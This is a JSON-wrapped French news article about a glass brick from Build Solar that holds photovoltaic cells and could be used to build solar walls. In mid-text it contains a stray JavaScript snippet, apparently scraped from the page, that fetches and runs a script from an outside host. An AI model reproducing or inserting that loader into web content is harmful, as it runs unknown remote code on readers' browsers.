{"title": "Cette brique de verre est un panneau solaire", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "18/08/2017", "content": "Build Solar, une entreprise issue des travaux de l'université d'Exeter (Royaume-Uni), a conçu une brique de verre incorporant des optiques qui concentrent les rayons du soleil vers des cellules photovoltaïques. On peut ainsi créer des murs photovoltaïques pour les habitations. Les  toits  sont les emplacements de prédilection pour l'installation de panneaux ou de  tuiles solaires . Mais d'autres surfaces d'un bâtiment bénéficient d'une exposition favorable qui pourrait également être exploitée, notamment les façades. Grâce aux travaux menés par l' université d’Exeter  (Royaume-Uni), il sera peut-être bientôt possible de construire des  murs  en briques de verre capables de récupérer l' énergie  solaire. La jeune pousse  Build Solar , créée à partir de ces travaux, a mis au point une brique de verre qui intègre un système optique s'apparentant à des  lentilles  qui captent les rayons du  soleil  et les orientent vers des  cellules photovoltaïques . L'avantage du dispositif, nommé Solar Squared, est qu'il parvient à recueillir le rayonnement même lorsque les briques sont en position verticale.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Une isolation thermique supérieure aux briques de verre classiques Les cellules sont reliées entre elles et les briques peuvent être interconnectées pour former un réseau qui injectera l'énergie dans le  réseau électrique  ou une batterie de stockage. Selon Build Solar, ces briques en verre  transparent  laissent passer la  lumière , mais il est possible de les teinter pour éviter que cela n'engendre trop de  chaleur  dans une pièce. Le constructeur assure également que son produit offre une meilleure  isolation thermique  que les briques en verre standards. En revanche, il ne fournit pour le moment aucune information précise sur le rendement de ces briques de  verre photovoltaïques  ni sur leur tarif. Build Solar est actuellement à la recherche de sites pilotes pour déployer sa technologie. ", "theme": "maison"}